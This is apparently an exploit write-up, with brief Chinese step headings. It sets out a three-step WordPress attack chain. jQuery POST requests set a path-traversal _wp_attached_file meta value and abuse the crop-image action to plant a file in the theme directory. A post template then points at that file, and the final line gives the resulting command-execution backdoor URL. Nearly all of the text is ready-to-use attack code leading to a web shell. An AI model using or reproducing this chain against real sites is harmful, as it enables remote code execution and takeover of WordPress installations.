## part 1
第一次 rename -> crop 是為了要產生路徑：`payload.jpg?/dummy` => directory `payload.jpg?`

``` js
jQuery.post("post.php", {
 '_wpnonce': post._wpnonce.value,
 'action': 'editpost',
 'post_ID': post.post_ID.value,
 'meta_input[_wp_attached_file]': '2021/05/payload.jpg?/dummy',
});

jQuery.post("admin-ajax.php", {
 '_ajax_nonce': (()=>{
 let btn = document.querySelector('input[onclick^="imageEdit"]');
 let funcText = btn.getAttribute('onclick');
 return funcText.substring(funcText.indexOf('"') + 1, funcText.lastIndexOf('"'));
 })(),
 'action': 'crop-image',
 'id': post.post_ID.value,
 'cropDetails[width]': 262,
 'cropDetails[height]': 192,
});
```

## part 2
第二次 rename -> crop 是在 theme directory 內建立 crop 過的檔案

``` js
jQuery.post("post.php", {
 '_wpnonce': post._wpnonce.value,
 'action': 'editpost',
 'post_ID': post.post_ID.value,
 'meta_input[_wp_attached_file]':
'2021/05/payload.jpg?/../../../../themes/twentynineteen/shell',
});

jQuery.post("admin-ajax.php", {
 '_ajax_nonce': (()=>{
 let btn = document.querySelector('input[onclick^="imageEdit"]');
 let funcText = btn.getAttribute('onclick');
 return funcText.substring(funcText.indexOf('"') + 1, funcText.lastIndexOf('"'));
 })(),
 'action': 'crop-image',
 'id': post.post_ID.value,
 'cropDetails[width]': 262,
 'cropDetails[height]': 192,
});
```

## part 3
Write post and get shell

``` js 
let newPostForm = document.querySelector('form.metabox-base-form');
jQuery.post("post.php", {
 '_wpnonce': newPostForm._wpnonce.value,
 'action': 'editpost',
 'post_ID': newPostForm.post_ID.value,
 'post_title': 'SHELL',
 'visibility': 'public',
 'publish': 'Publish',
 'meta_input[_wp_page_template]': 'cropped-shell.jpg'
});
```

backdoor: `http://url/path_of_post/0=<command>`